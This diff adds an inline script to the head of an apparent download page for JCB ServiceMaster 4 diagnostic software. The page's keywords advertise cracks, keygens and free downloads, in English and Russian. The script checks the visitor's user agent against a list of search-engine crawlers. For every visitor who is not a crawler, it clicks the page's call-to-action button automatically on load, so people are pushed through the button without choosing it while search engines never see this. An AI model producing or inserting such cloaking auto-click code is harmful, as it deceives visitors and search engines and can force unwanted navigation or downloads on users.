@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>JCB ServiceMaster 4 V24.7.2 08.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="JCB ServiceMaster 4 V24.7.2 08.2024 diagnostic software covers calibration, diagnostics, and fault/error codes for JCB machinery and engines.">
     <meta name="keywords" content="JCB ServiceMaster 4 V24.7.2 08.2024, JCB ServiceMaster 4, JCB ServiceMaster 4 2024, diagnostic software JCB, agricultural machinery diagnostics, JCB engine calibration, ServiceMaster 4 V24.7.2, JCB diagnostic tool, JCB electronic diagnostics, ServiceMaster 4 software, JCB machinery software, JCB engine diagnostics, agricultural equipment JCB, JCB ServiceMaster 4 update, JCB calibration software, diagnostic tool for JCB engines, JCB machinery electronic product, JCB diagnostic software, agricultural machinery diagnostics, JCB troubleshooting, JCB calibration software, JCB transmission diagnostics, JCB electrical schematics, JCB fault codes, JCB ECU flashing, JCB service tool, construction equipment diagnostics, JCB backhoe loader diagnostics, JCB excavator diagnostics, JCB Fastrac diagnostics, JCB genset diagnostics, JCB Dieselmax diagnostics, JCB Ecomax diagnostics, JCB Livelink diagnostics, JCB Loadall diagnostics, JCB skid steer diagnostics, JCB Teletruk diagnostics, heavy equipment software, JCB repair software, agricultural equipment maintenance, construction vehicle diagnostics, JCB error code reader, JCB engine parameter modification, JCB harness drawings, JCB cluster diagnostics, heavy machinery troubleshooting, JCB service manual, construction equipment repair, JCB parts lookup, agricultural vehicle diagnostics, JCB technical support, heavy equipment maintenance, JCB software update, construction machinery diagnostics, JCB vehicle compatibility, construction equipment software, JCB diagnostic adapter, heavy machinery software, JCB ServiceMaster features, agricultural vehicle repair, JCB diagnostic software download, JCB diagnostic software crack, JCB diagnostic software keygen, JCB ServiceMaster 4 V24.7.2 free download, JCB diagnostic software free download, JCB ServiceMaster 4 V24.7.2 скачать бесплатно, сервис master 4 JCB диагностика скачать, сервис master 4 JCB диагностика скачать бесплатно, сервис master 4 JCB диагностика скачать кряк, JCB diagnostic software скачать бесплатно">
     <style>
